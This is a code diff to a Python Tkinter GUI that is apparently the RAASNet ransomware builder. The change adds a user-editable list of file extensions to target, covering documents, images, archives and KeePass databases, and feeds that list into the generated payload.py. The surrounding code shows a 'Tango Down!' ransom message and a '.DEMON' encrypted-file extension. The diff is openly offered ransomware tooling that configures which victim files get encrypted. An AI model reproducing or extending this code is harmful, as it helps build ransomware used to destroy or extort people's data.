@@ -169,6 +169,9 @@ class MainWindow(Tk):
             'img_base64' : StringVar(),
             'debug' : IntVar(),
             'ext' : StringVar(),
+            'target_ext' : StringVar(),
+            'new_target_ext' : StringVar(),
+
         }
 
 
@@ -187,6 +190,34 @@ class MainWindow(Tk):
         self.options['type'].set('pycrypto')
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
+
+        self.options['target_ext'].set('''txt
+ppt
+pptx
+doc
+docx
+gif
+jpg
+png
+ico
+mp3
+ogg
+csv
+xls
+exe
+pdf
+ods
+odt
+kdbx
+kdb
+mp4
+flv
+ini
+iso
+zip
+tar
+tar.gz
+rar''')
 
         self.options['msg'].set('''Tango Down!
 
@@ -557,6 +588,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         content_frame.grid(row = 1, column = 0, sticky = 'w')
         set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
         set_img = Button(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)
+        set_ext = Button(content_frame, text = 'CUSTOM FILE EXTENTIONS', command = self.set_ext, width = 25).grid(row = 2, column = 0)
 
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
         enc_frame.grid(row = 1, column = 1, sticky = 'w')
@@ -595,6 +627,30 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.options['msg'].set(self.options['new_msg'].get('1.0', END))
         self.message.destroy()
 
+    def set_ext(self):
+        self.extentions = Toplevel()
+        self.extentions.title(string = 'Set File Extentions')
+        self.extentions.configure(background = 'white')
+        self.extentions.resizable(0,0)
+
+        self.extentions.bind("<Escape>", self.close_set_target_ext)
+
+        self.options['new_target_ext'] = Text(self.extentions, height = 15, width = 25)
+        self.options['new_target_ext'].grid(row = 0, column = 0)
+
+        scrollb = Scrollbar(self.extentions, command=self.options['new_target_ext'].yview)
+        scrollb.grid(row=0, column=1, sticky='nsew')
+        self.options['new_target_ext']['yscrollcommand'] = scrollb.set
+
+        save = Button(self.extentions, text = 'SAVE', command = self.change_target_ext, width = 15).grid(row = 1, column = 0)
+
+        self.options['new_target_ext'].insert(END, self.options['target_ext'].get())
+        self.options['new_target_ext'].focus()
+
+    def change_target_ext(self):
+        self.options['target_ext'].set(self.options['new_target_ext'].get('1.0', END))
+        self.extentions.destroy()
+
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
@@ -610,7 +666,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['msg'].get(),
                 self.options['img_base64'].get(),
                 self.options['mode'].get(),
-                self.options['debug'].get())
+                self.options['debug'].get(),
+                self.options['target_ext'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
@@ -777,6 +834,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def close_set_msg(self, event):
         self.message.destroy()
+
+    def close_set_target_ext(self, event):
+        self.extentions.destroy()
 
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
